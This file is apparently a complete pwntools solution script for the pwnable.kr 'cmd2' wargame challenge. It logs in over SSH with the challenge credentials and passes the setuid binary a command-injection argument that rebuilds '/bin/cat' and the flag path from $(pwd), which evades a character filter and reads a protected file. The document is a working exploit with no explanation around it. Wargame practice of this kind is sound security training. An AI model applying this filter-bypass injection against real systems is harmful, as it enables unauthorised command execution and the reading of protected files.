#coding=utf-8
from pwn import *

s = ssh(host = 'pwnable.kr', port = 2222, user = 'cmd2', password = 'mommy now I get what PATH environment is for :)')
s.set_working_directory('/')
p = s.process(['/home/cmd2/cmd2', '\"\"$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*\"\"'])
print p.recvall(1)
